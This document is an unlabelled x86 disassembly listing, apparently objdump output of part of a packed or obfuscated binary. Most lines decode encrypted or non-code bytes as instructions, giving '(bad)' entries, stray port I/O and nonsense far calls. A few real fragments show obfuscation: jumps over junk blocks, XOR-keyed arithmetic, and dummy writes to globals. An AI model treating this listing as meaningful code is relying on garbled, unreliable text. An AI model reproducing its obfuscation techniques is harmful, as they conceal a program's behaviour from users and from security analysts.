  409593:	out    dx,al
  409594:	(bad)  
  409596:	adc    DWORD PTR [ecx],0xffffff99
  409599:	test   al,0xcc
  40959b:	mov    eax,0x3c25ce21
  4095a0:	pop    ebx
  4095a1:	push   esi
  4095a2:	ret    0x82ae
  4095a5:	out    0x6a,al
  4095a7:	mov    ss,WORD PTR [edx]
  4095a9:	aas    
  4095aa:	out    dx,eax
  4095ab:	jp     0x4095b7
  4095ad:	dec    edi
  4095ae:	adc    esi,DWORD PTR [edx]
  4095b0:	xor    BYTE PTR ds:0xbfa18ad5,bh
  4095b6:	xchg   BYTE PTR [edx],dl
  4095b8:	sbb    BYTE PTR [edi+0x3ddaf8fa],0xa6
  4095bf:	inc    esi
  4095c0:	retf   
  4095c1:	je     0x409572
  4095c3:	inc    ebx
  4095c4:	cmp    edx,DWORD PTR [edx-0x4f]
  4095c7:	test   BYTE PTR [eax],al
  4095c9:	imul   BYTE PTR [ebx]
  4095cb:	push   edi
  4095cc:	inc    ebx
  4095cd:	inc    esi
  4095ce:	push   es
  4095cf:	push   ebp
  4095d0:	cmp    DWORD PTR [eax+0xe75af45],ebx
  4095d6:	stos   DWORD PTR es:[edi],eax
  4095d7:	adc    eax,eax
  4095d9:	jo     0x40960b
  4095db:	jmp    ecx
  4095dd:	das    
  4095de:	addr16 mov edi,0xbaa35b9f
  4095e4:	inc    ebx
  4095e5:	mov    eax,0x5a889d7f
  4095ea:	jne    0x4095cd
  4095ec:	push   ebp
  4095ed:	es dec esi
  4095ef:	jle    0x409609
  4095f1:	shl    DWORD PTR [edi+0x1ecf6f41],0x2e
  4095f8:	mov    al,0x9c
  4095fa:	pushf  
  4095fb:	mov    esp,0xef978415
  409600:	adc    eax,DWORD PTR [eax]
  409602:	nop
  409603:	pop    esp
  409604:	adc    ebp,DWORD PTR [ebx]
  409606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409607:	daa    
  409608:	or     al,0xd2
  40960a:	or     DWORD PTR [eax],esp
  40960c:	popf   
  40960d:	inc    DWORD PTR [edx+0x70fb5d39]
  409613:	ins    DWORD PTR es:[edi],dx
  409614:	push   0x56
  409616:	sbb    DWORD PTR [ecx+0x65],esi
  409619:	or     edx,DWORD PTR cs:[ecx-0x388d5305]
  409620:	psrld  mm4,QWORD PTR [edi+0x3257fd1b]
  409627:	push   eax
  409628:	cmp    al,0x44
  40962a:	es daa 
  40962c:	loope  0x40966d
  40962e:	xchg   edi,eax
  40962f:	cli    
  409630:	(bad)  
  409631:	out    0xa0,al
  409633:	out    0x3,al
  409635:	push   ebp
  409636:	in     al,dx
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	lock jbe 0x4096d0
  409656:	and    bh,dh
  409658:	out    0x70,al
  40965a:	jo     0x4096c5
  40965c:	jg     0x4096ce
  40965e:	jo     0x4095e6
  409660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409661:	inc    ecx
  409662:	adc    bh,BYTE PTR [esi-0xb]
  409665:	adc    esi,DWORD PTR [edx]
  409667:	mov    dh,ah
  409669:	test   al,0xdc
  40966b:	into   
  40966c:	stc    
  40966d:	xchg   cl,ch
  40966f:	inc    ebx
  409670:	inc    ebx
  409671:	jb     0x4096b9
  409673:	inc    esi
  409674:	inc    ecx
  409675:	mov    bl,BYTE PTR [ebx+0x93bb770]
  40967b:	cdq    
  40967c:	xor    cl,dl
  40967e:	mov    dh,0xec
  409680:	push   ecx
  409681:	sub    bl,BYTE PTR [esi]
  409683:	mov    ch,0x1c
  409685:	inc    edi
  409686:	(bad)  
  409687:	xor    al,0x95
  409689:	shl    DWORD PTR [eax+0x2c],1
  40968c:	mov    al,ds:0x95dc1315
  409691:	mov    al,0x45
  409693:	push   esp
  409694:	jne    0x409665
  409696:	arpl   WORD PTR [ecx],bp
  409698:	mov    eax,0x4b47e28
  40969d:	sbb    dh,cl
  40969f:	pop    ebx
  4096a0:	and    ebp,ebp
  4096a2:	cmp    eax,0x6b6165c1
  4096a7:	in     eax,dx
  4096a8:	mov    ds:0x2504a531,eax
  4096ad:	out    dx,al
  4096ae:	ja     0x40966c
  4096b0:	or     al,0xcf
  4096b2:	loope  0x409730
  4096b4:	sub    esp,DWORD PTR [edx]
  4096b6:	aam    0xb7
  4096b8:	call   0xfd9a51cb
  4096bd:	sahf   
  4096be:	sbb    eax,0x1fac789d
  4096c3:	mov    edi,0x527630b0
  4096c8:	adc    ebp,0x9
  4096cb:	add    edx,DWORD PTR [esi+edx*4]
  4096ce:	adc    ebp,edx
  4096d0:	and    eax,0xb502a958
  4096d5:	clts   
  4096d7:	in     eax,dx
  4096d8:	js     0x4096f6
  4096da:	dec    ebx
  4096db:	push   ds
  4096dc:	addr16 sub eax,0x6a940920
  4096e2:	ss shr edi,0x47
  4096e6:	jae    0x4096eb
  4096e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096e9:	out    0xd9,eax
  4096eb:	dec    eax
  4096ec:	popa   
  4096ed:	push   esi
  4096ee:	and    al,0x39
  4096f0:	lods   eax,DWORD PTR ds:[esi]
  4096f1:	shl    dl,cl
  4096f3:	outs   dx,DWORD PTR ds:[esi]
  4096f4:	xchg   bl,ch
  4096f6:	loope  0x409698
  4096f8:	jns    0x4096a7
  4096fa:	push   cs
  4096fb:	jb     0x4096a8
  4096fd:	rcl    eax,cl
  4096ff:	fiadd  DWORD PTR [ecx-0x15]
  409702:	loop   0x409743
  409704:	mov    al,0xcb
  409706:	(bad)  
  409707:	out    dx,al
  409708:	es (bad) 
  40970b:	and    eax,0x8354877b
  409710:	cmp    ch,BYTE PTR [esp+edx*4+0x495f8012]
  409717:	repz cld 
  409719:	xchg   edx,eax
  40971b:	jp     0x409713
  40971d:	xlat   BYTE PTR ds:[ebx]
  40971e:	adc    DWORD PTR [ebp-0x6d224977],ecx
  409724:	mov    ecx,0xcb7b0153
  409729:	mov    ah,0x14
  40972b:	jns    0x40979d
  40972d:	or     BYTE PTR [ecx],dl
  40972f:	fisubr WORD PTR [eax]
  409731:	das    
  409732:	inc    ebp
  409733:	cmp    bh,dh
  409735:	mov    esi,0x6bb318dd
  40973a:	addr16 mov ah,0x30
  40973d:	mov    ebp,0x989fe29f
  409742:	inc    edi
  409743:	add    al,0x68
  409745:	out    dx,ax
  409747:	mov    eax,ds:0x60fc8c0d
  40974c:	jmp    0x64d429b3
  409751:	mov    edx,0xbe00bfe0
  409756:	inc    ebx
  409757:	push   cs
  409758:	(bad)  
  409759:	bound  ecx,QWORD PTR [eax+0x63]
  40975c:	daa    
  40975d:	sub    BYTE PTR [ecx+eiz*8+0x3c9d61de],0x32
  409765:	int    0x31
  409767:	bound  edi,QWORD PTR [bx+0x495b]
  40976c:	dec    edx
  40976d:	push   edx
  40976e:	cli    
  40976f:	scas   al,BYTE PTR es:[edi]
  409770:	jae    0x409708
  409772:	retf   
  409773:	loopne 0x4097b5
  409775:	ins    DWORD PTR es:[edi],dx
  409776:	push   cs
  409777:	retf   0xce20
  40977a:	sbb    edx,DWORD PTR [edx-0x39]
  40977d:	pusha  
  40977e:	inc    edx
  40977f:	(bad)  
  409780:	pop    ds
  409781:	or     DWORD PTR ds:0x15184540,ebp
  409787:	adc    al,0xb5
  409789:	push   ebp
  40978a:	rcr    BYTE PTR [eax+0x7f],cl
  40978d:	jmp    0x4097ea
  40978f:	retf   
  409790:	rcl    DWORD PTR [edx+eax*1+0x2ba6aff3],1
  409797:	jno    0x40971b
  409799:	je     0x409791
  40979b:	add    edi,ecx
  40979d:	int    0x98
  40979f:	mov    cl,0xe3
  4097a1:	add    eax,0xc7432a66
  4097a6:	sbb    eax,0x6d7c9c5f
  4097ab:	bnd jmp 0xfd83c48
  4097b1:	and    al,0x68
  4097b3:	test   DWORD PTR [ebx-0x54dc0818],esi
  4097b9:	out    dx,eax
  4097ba:	cmp    DWORD PTR [esi+ecx*4],0xc6caaf2e
  4097c1:	(bad)  
  4097c2:	cmp    al,0x41
  4097c4:	jbe    0x409799
  4097c6:	mov    al,ds:0x7cb22b4b
  4097cb:	mov    ch,0xc5
  4097cd:	jb     0x4097e4
  4097cf:	bound  edi,QWORD PTR [edx]
  4097d1:	mov    dh,BYTE PTR [ebp-0x79]
  4097d4:	push   esi
  4097d5:	out    0x45,al
  4097d7:	mov    ds:0xdd3e01b3,al
  4097dc:	imul   esi,DWORD PTR [ecx+0x50],0xd5e1ae53
  4097e3:	rcr    DWORD PTR [edi-0x4358c704],cl
  4097e9:	jbe    0x40978c
  4097eb:	xor    bl,BYTE PTR [ebx-0x39c19caf]
  4097f1:	dec    ebp
  4097f2:	(bad)  
  4097f3:	cld    
  4097f4:	daa    
  4097f5:	arpl   cx,ax
  4097f7:	sbb    bl,BYTE PTR [edx+0x79dedcf8]
  4097fd:	cmp    al,0x59
  4097ff:	mov    DWORD PTR [esi],eax
  409801:	lahf   
  409802:	cmp    eax,0x94a1a2b5
  409807:	sbb    eax,0xb8a7ce64
  40980c:	xchg   ebx,eax
  40980d:	(bad)  
  40980e:	hlt    
  40980f:	inc    ebp
  409810:	lock (bad) 
  409812:	jmp    0x85f0:0x5d7fe0f4
  409819:	sbb    al,0xa7
  40981b:	xchg   edx,eax
  40981c:	dec    eax
  40981d:	mov    esp,0x218f5fd4
  409822:	or     ecx,DWORD PTR [ebp+esi*8-0x3889d3fc]
  409829:	jb     0x4097f8
  40982b:	dec    esi
  40982c:	dec    ebp
  40982d:	xchg   edx,eax
  40982e:	in     eax,0xa7
  409830:	out    dx,eax
  409831:	bound  edx,QWORD PTR [ebx+ebx*2]
  409834:	and    eax,0x6d5ad987
  409839:	adc    esi,DWORD PTR [edi-0x76fc64ad]
  40983f:	test   DWORD PTR [esi+ebx*4+0x24518ffa],esp
  409846:	lock add edx,DWORD PTR ds:0x6ef63c51
  40984d:	lds    esp,FWORD PTR [esi+ebx*1+0x18a2a736]
  409854:	(bad)  
  409855:	mov    DWORD PTR [ebx],0xd7af0fd1
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0x8f7bf628
  40989a:	jp     0x40982c
  40989c:	mov    fs,eax
  40989e:	in     al,0x70
  4098a0:	jo     0x40990b
  4098a2:	jg     0x409914
  4098a4:	jo     0x409907
  4098a6:	(bad)  
  4098a7:	mov    edx,0x8fa92c6f
  4098ac:	sub    BYTE PTR [ebx],bl
  4098ae:	pop    eax
  4098af:	(bad)  
  4098b0:	sbb    ecx,DWORD PTR [edx]
  4098b2:	mov    ds:0xe3e3457b,al
  4098b7:	jno    0x409929
  4098b9:	hlt    
  4098ba:	jmp    0xbe6657e9
  4098bf:	aad    0xa7
  4098c1:	xor    edx,0xb213e23b
  4098c7:	jne    0x4098a3
  4098c9:	loop   0x409853
  4098cb:	seto   BYTE PTR [eax+0x7cdb9a02]
  4098d2:	pop    esp
  4098d3:	inc    edi
  4098d4:	and    bh,dl
  4098d6:	xor    bl,BYTE PTR [ecx+0x1c801ef8]
  4098dc:	test   BYTE PTR [esi-0x2a732de],bl
  4098e2:	mov    ebp,0x53219829
  4098e7:	lahf   
  4098e8:	dec    eax
  4098e9:	push   ebp
  4098ea:	mov    eax,ds:0x1197faa7
  4098ef:	lahf   
  4098f0:	test   eax,0x864aa23d
  4098f5:	dec    esi
  4098f6:	xor    eax,DWORD PTR [ecx]
  4098f8:	dec    esi
  4098f9:	jae    0x409971
  4098fb:	push   0x3a
  4098fd:	dec    BYTE PTR [edx]
  4098ff:	inc    edi
  409900:	sbb    ecx,eax
  409902:	sahf   
  409903:	mov    bl,0xc4
  409905:	repz popa 
  409907:	nop
  409908:	jp     0x4098bd
  40990a:	dec    ebx
  40990b:	and    BYTE PTR [ecx+0x5202ddfd],ah
  409911:	sub    ecx,DWORD PTR [edx-0x6734237c]
  409917:	and    DWORD PTR [edx],edx
  409919:	pop    es
  40991a:	mov    ebx,0x74587834
  40991f:	retf   0x55fe
  409922:	dec    edx
  409923:	jl     0x40990c
  409925:	push   esp
  409926:	pop    eax
  409927:	imul   esp
  409929:	and    eax,ecx
  40992b:	xchg   DWORD PTR [ebp-0x3e],edi
  40992e:	bound  bp,DWORD PTR [ebp+0x21385360]
  409935:	clc    
  409936:	nop
  409937:	js     0x40993b
  409939:	out    0x82,eax
  40993b:	adc    BYTE PTR [edx-0x61],dh
  40993e:	mov    ds:0xf5d759dc,al
  409943:	in     al,dx
  409944:	(bad)  
  409945:	fxch   st(0)
  409947:	xchg   edx,eax
  409948:	sub    BYTE PTR [edi+0x309e9aeb],ah
  40994e:	hlt    
  40994f:	mov    edx,0xda59b6c
  409954:	nop
  409955:	sti    
  409956:	sbb    al,0xc8
  409958:	jle    0x4099aa
  40995a:	int    0xb3
  40995c:	mov    esp,0x2209aa89
  409961:	popf   
  409962:	mov    esi,0x1fc80f07
  409967:	nop
  409968:	mov    ecx,0x54c8927d
  40996d:	mov    ebp,0x62d25087
  409972:	in     al,dx
  409973:	sar    DWORD PTR [ebx],cl
  409975:	pop    edi
  409976:	jecxz  0x40992b
  409978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409979:	xchg   esi,eax
  40997a:	jno    0x409986
  40997c:	daa    
  40997d:	pop    esp
  40997e:	sbb    ebp,DWORD PTR ds:0xd3fd0a2
  409984:	lock inc eax
  409986:	inc    ebx
  409987:	lods   al,BYTE PTR ds:[esi]
  409988:	sbb    DWORD PTR [ecx+0x3f07dd47],0x2d
  40998f:	inc    ecx
  409990:	dec    edi
  409991:	pop    esi
  409992:	adc    BYTE PTR [ebx-0x384cd5e8],cl
  409998:	int    0xe
  40999a:	stos   BYTE PTR es:[edi],al
  40999b:	stos   BYTE PTR es:[edi],al
  40999c:	hlt    
  40999d:	jo     0x40999d
  40999f:	push   esp
  4099a0:	mov    bl,ah
  4099a2:	xchg   ebx,eax
  4099a3:	jp     0x409940
  4099a5:	sti    
  4099a6:	xor    dh,dh
  4099a8:	sub    DWORD PTR [eax+0x5d],eax
  4099ab:	add    BYTE PTR [ebx],0x4e
  4099ae:	test   DWORD PTR [eax],edi
  4099b0:	sbb    cl,BYTE PTR [eax-0x42c8d02f]
  4099b6:	test   DWORD PTR [eax],esi
  4099b8:	pop    es
  4099b9:	mov    BYTE PTR [ecx],dh
  4099bb:	push   cs
  4099bc:	sbb    DWORD PTR [edx-0xcf6ffb3],esi
  4099c2:	inc    ebx
  4099c3:	jmp    0x40994b
  4099c5:	not    BYTE PTR [ecx+0x15]
  4099c8:	mov    ebp,DWORD PTR [ecx+eax*8+0x1ba69fda]
  4099cf:	int    0x62
  4099d1:	cmp    BYTE PTR [ecx],0x19
  4099d4:	or     al,0x8a
  4099d6:	pop    esi
  4099d7:	fiadd  WORD PTR [edx+0x2c]
  4099da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099db:	cmp    al,0xc2
  4099dd:	outs   dx,DWORD PTR ds:[esi]
  4099de:	fidiv  DWORD PTR [ebx+0x1d]
  4099e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099e2:	stos   BYTE PTR es:[edi],al
  4099e3:	jb     0x409984
  4099e5:	call   0xde72:0x13475171
  4099ec:	sbb    ecx,DWORD PTR [esi+0x1]
  4099ef:	push   bx
  4099f1:	stos   BYTE PTR es:[edi],al
  4099f2:	sub    al,ah
  4099f4:	dec    ebx
  4099f5:	call   0xe0dd64
  4099fa:	mov    edx,0x7e7d1436
  4099ff:	jmp    0x409a25
  409a01:	jge    0x409983
  409a03:	inc    edx
  409a04:	fidiv  WORD PTR [edx]
  409a06:	adc    edi,DWORD PTR [ecx]
  409a08:	pushf  
  409a09:	loop   0x409a74
  409a0b:	gs dec eax
  409a0d:	sbb    DWORD PTR [ebx+eiz*1-0x7e16c23d],edx
  409a14:	lods   eax,DWORD PTR ds:[esi]
  409a15:	cmp    bl,BYTE PTR [ebx]
  409a17:	pop    edx
  409a18:	loopne 0x409a72
  409a1a:	(bad)  
  409a1b:	ja     0x409a8c
  409a1d:	add    BYTE PTR [esi],cl
  409a1f:	push   edx
  409a20:	les    edx,FWORD PTR [esi]
  409a22:	icebp  
  409a23:	jmp    0x409aa4
  409a25:	ret    0xd5fa
  409a28:	in     al,0xc4
  409a2a:	fcom   DWORD PTR [ebx-0x32e4d6a4]
  409a30:	pop    edi
  409a31:	stc    
  409a32:	call   0xc51:0x6cd716bb
  409a39:	mov    dh,0x2b
  409a3b:	xlat   BYTE PTR ds:[ebx]
  409a3c:	cdq    
  409a3d:	add    DWORD PTR [edi+eiz*2-0x6ee83b2f],esi
  409a44:	sbb    al,0x9a
  409a46:	mov    eax,ds:0xde6451aa
  409a4b:	mov    bl,0x74
  409a4d:	pop    ecx
  409a4e:	pop    ecx
  409a4f:	shl    DWORD PTR [ecx-0x52],0x63
  409a53:	lods   eax,DWORD PTR ds:[esi]
  409a54:	dec    ebp
  409a55:	clc    
  409a56:	(bad)  
  409a57:	out    0x8c,eax
  409a59:	je     0x409ad9
  409a5b:	std    
  409a5c:	add    esp,DWORD PTR [ecx+0xd216d20]
  409a62:	out    dx,eax
  409a63:	test   al,0xd2
  409a65:	fiadd  WORD PTR [eax-0x29]
  409a68:	dec    ecx
  409a69:	cdq    
  409a6a:	and    dh,0xdc
  409a6d:	xor    al,BYTE PTR [ebp-0x2acc6f71]
  409a73:	cmp    al,0x8c
  409a75:	aad    0xa3
  409a77:	inc    esi
  409a78:	retf   
  409a79:	in     eax,dx
  409a7a:	or     DWORD PTR [ebp-0x5b],ebx
  409a7d:	jl     0x409af3
  409a7f:	(bad)  
  409a82:	sub    al,0xe2
  409a84:	(bad)  
  409a85:	imul   edx,ebx,0x72cd216e
  409a8b:	loop   0x409a98
  409a8d:	test   eax,0xb8cdcbeb
  409a92:	rol    ebx,1
  409a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a95:	pop    edx
  409a96:	mov    dl,0xea
  409a98:	enter  0x937,0xbc
  409a9c:	mov    edi,DWORD PTR [ebp-0x24]
  409a9f:	xor    edx,eax
  409aa1:	add    edx,ecx
  409aa3:	imul   edx,edi
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    bh,ah
  409acf:	fdiv   QWORD PTR [ecx+0x70e2d9a1]
  409ad5:	jo     0x409b40
  409ad7:	jg     0x409b49
  409ad9:	jo     0x409b03
  409adb:	pop    ss
  409adc:	xchg   ecx,eax
  409add:	fidiv  WORD PTR [bx+si+0x5522]
  409ae2:	cmp    dl,BYTE PTR ds:0x96bbc33
  409ae8:	inc    ecx
  409ae9:	jnp    0x409ada
  409aeb:	mov    WORD PTR [esi-0x19],es
  409aee:	hlt    
  409aef:	ret    
  409af0:	mov    ah,0x99
  409af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409af3:	jl     0x409b54
  409af5:	addr16 inc ecx
  409af7:	cmp    edi,0xffffff8c
  409afa:	and    DWORD PTR [ecx-0xe],0xe8da47b6
  409b01:	mov    dh,0xb3
  409b03:	or     al,0xf3
  409b05:	push   edx
  409b06:	les    edi,FWORD PTR [ecx*2+0x5b8d739b]
  409b0d:	fdivr  DWORD PTR [edi]
  409b0f:	xor    edi,DWORD PTR [esi]
  409b11:	retf   
  409b12:	test   eax,0xd1b69ebf
  409b17:	addr16 mov ch,0xb5
  409b1a:	xor    al,0x93
  409b1c:	rol    BYTE PTR [ebx],1
  409b1e:	sub    BYTE PTR [edx-0x2347c532],ah
  409b24:	aad    0x9f
  409b26:	call   0x94d1:0xafa2f5b1
  409b2d:	(bad)  
  409b2f:	fdivp  st(4),st
  409b31:	cmp    al,0x3c
  409b33:	fmul   st,st(4)
  409b35:	xor    al,0x4d
  409b37:	sbb    eax,0x9fa33a10
  409b3c:	add    ah,dl
  409b3e:	mov    eax,ds:0x488f0168
  409b43:	xchg   ah,cl
  409b45:	push   0xffffffef
  409b47:	add    cl,cl
  409b49:	ficom  DWORD PTR [edx-0x39f30a18]
  409b4f:	inc    eax
  409b50:	stos   DWORD PTR es:[edi],eax
  409b51:	xchg   esp,eax
  409b52:	dec    ebp
  409b53:	clc    
  409b54:	(bad)  [ecx]
  409b56:	enter  0x74f0,0x3
  409b5a:	mov    ds:0x773950c7,al
  409b5f:	mov    eax,ds:0xd54a1265
  409b64:	sar    BYTE PTR [ebp-0x64],1
  409b67:	mov    ds,WORD PTR [ebx+0x7d]
  409b6a:	and    dl,ch
  409b6c:	repnz dec eax
  409b6e:	js     0x409bb1
  409b70:	jmp    0x409be4
  409b72:	push   esp
  409b73:	pop    esp
  409b74:	ficom  DWORD PTR [edi+0x3302ef66]
  409b7a:	or     al,0xac
  409b7c:	xchg   ebp,eax
  409b7d:	inc    esi
  409b7e:	pop    ecx
  409b7f:	add    DWORD PTR [eax],edi
  409b81:	imul   ebx,DWORD PTR [ecx+ebp*8],0xffffff93
  409b85:	and    DWORD PTR [edi-0x39],eax
  409b88:	pop    ebp
  409b89:	xchg   ebp,eax
  409b8a:	add    al,0xd1
  409b8c:	sub    dh,BYTE PTR ds:0xd412c6e1
  409b92:	xchg   edi,eax
  409b93:	idiv   BYTE PTR [ebx-0x4e7fb5d3]
  409b99:	pop    ebx
  409b9a:	hlt    
  409b9b:	or     DWORD PTR [edx+0x18],0xffffff8f
  409b9f:	repnz imul esp,DWORD PTR [ecx-0x4c5fd9e1],0x47
  409ba7:	out    dx,eax
  409ba8:	jecxz  0x409bf9
  409baa:	leave  
  409bab:	es dec edx
  409bad:	ror    BYTE PTR [ecx+0x20e5a38b],0xd6
  409bb4:	and    DWORD PTR [ebp+edx*2-0x9],0xffffffe4
  409bb9:	dec    edi
  409bba:	mov    ebp,0x508c1b45
  409bbf:	mov    al,ds:0x375f73ea
  409bc4:	inc    edx
  409bc5:	mov    ch,BYTE PTR [eax-0x14ad9037]
  409bcb:	cmp    BYTE PTR [edi],al
  409bcd:	cmp    eax,0x1d81d447
  409bd3:	ja     0x409c21
  409bd5:	mov    ds:0xdd9e9148,eax
  409bda:	jo     0x409b64
  409bdc:	or     eax,0xfca967fc
  409be1:	xchg   esi,eax
  409be2:	mov    edi,ecx
  409be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be5:	hlt    
  409be6:	sub    ebp,ebp
  409be8:	loope  0x409bfc
  409bea:	(bad)  
  409beb:	int    0xd1
  409bed:	repnz sahf 
  409bef:	out    dx,eax
  409bf0:	mov    cl,0xf
  409bf2:	into   
  409bf3:	adc    BYTE PTR [ebx-0xd],dl
  409bf6:	ins    BYTE PTR es:[edi],dx
  409bf7:	(bad)  
  409bf8:	add    al,0x82
  409bfa:	retf   0xaa18
  409bfd:	dec    BYTE PTR ds:0xe35e4df7
  409c03:	hlt    
  409c04:	jle    0x409b8a
  409c06:	cmp    BYTE PTR [esi*2-0x54d9b3e1],ch
  409c0d:	rcr    DWORD PTR [esi+0x3a8fac33],0x10
  409c14:	call   0x87522c04
  409c19:	repz jle 0x409ba6
  409c1c:	popa   
  409c1d:	into   
  409c1e:	(bad)  
  409c1f:	cmp    edi,ebx
  409c21:	dec    esp
  409c22:	out    dx,eax
  409c23:	push   cs
  409c24:	xchg   esp,eax
  409c25:	mov    ch,0x8
  409c27:	push   ebp
  409c28:	test   al,0x14
  409c2a:	cmp    bl,BYTE PTR [edi]
  409c2c:	dec    ebp
  409c2d:	sar    DWORD PTR [ebp-0x58],0xfb
  409c31:	sub    eax,0x673e4cc7
  409c36:	jl     0x409be3
  409c38:	sar    DWORD PTR [ebx+edi*4],cl
  409c3b:	fs mov ah,0x51
  409c3e:	sbb    esi,edx
  409c40:	pusha  
  409c41:	fs mov ecx,0xb6589588
  409c47:	cld    
  409c48:	push   ebx
  409c49:	xchg   ebx,eax
  409c4a:	xchg   edx,eax
  409c4b:	dec    edi
  409c4c:	xor    edi,edx
  409c4e:	xchg   edi,eax
  409c4f:	push   0x2580ca59
  409c54:	sub    al,ch
  409c56:	dec    eax
  409c57:	cld    
  409c58:	adc    bh,dl
  409c5a:	push   es
  409c5b:	in     eax,dx
  409c5c:	sbb    al,0xa6
  409c5e:	add    DWORD PTR [ebx-0x66e741c8],ebp
  409c64:	aam    0x45
  409c66:	(bad)  [eax]
  409c68:	(bad)  
  409c69:	jb     0x409c08
  409c6b:	pop    ds
  409c6c:	fiadd  WORD PTR [ebx+eiz*8-0xb]
  409c70:	std    
  409c71:	cmpxchg BYTE PTR [ebx+0x177a00f6],ah
  409c78:	scas   eax,DWORD PTR es:[edi]
  409c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c7a:	xchg   BYTE PTR [eax+0x1b],dl
  409c7d:	xor    dh,BYTE PTR [eax+esi*2+0x6]
  409c81:	xor    DWORD PTR [ebx-0x6b4061ef],esp
  409c87:	sub    bh,BYTE PTR [edx]
  409c89:	pop    es
  409c8a:	mov    esp,0x54f90f88
  409c8f:	test   al,0x1b
  409c91:	fisttp WORD PTR [ecx-0x70]
  409c94:	inc    edi
  409c95:	(bad)  
  409c96:	sub    al,0xb8
  409c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c99:	imul   ah
  409c9b:	rcl    BYTE PTR [ebx-0x39],1
  409c9e:	scas   al,BYTE PTR es:[edi]
  409c9f:	inc    ecx
  409ca0:	xor    DWORD PTR [eax-0x68],ebx
  409ca3:	sar    BYTE PTR [ebp-0x38e66ec7],1
  409ca9:	outs   dx,DWORD PTR ds:[esi]
  409caa:	push   eax
  409cab:	dec    edi
  409cac:	hlt    
  409cad:	cdq    
  409cae:	push   ss
  409caf:	dec    edx
  409cb0:	lods   eax,DWORD PTR ds:[esi]
  409cb1:	add    DWORD PTR [ebx+0x1],0x2b
  409cb5:	ret    0x1a90
  409cb8:	pushf  
  409cb9:	fidiv  DWORD PTR [edi+eiz*4+0x58ba1994]
  409cc0:	mov    ds:0x294c1d22,al
  409cc5:	add    eax,0x1344c379
  409cca:	repz pop edi
  409ccc:	sub    BYTE PTR [esi-0x15],cl
  409ccf:	sub    BYTE PTR [esi+0x33],0xd0
  409cd3:	mov    edi,0xffcd8d64
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43427a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432c36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432ce2,0x43428a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432c92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432cd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432cd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ba2
  409d6a:	add    DWORD PTR ds:0x434321,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432cc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434321,0x434315
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432604,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434329,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43429a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43429a
  409dcb:	inc    ecx
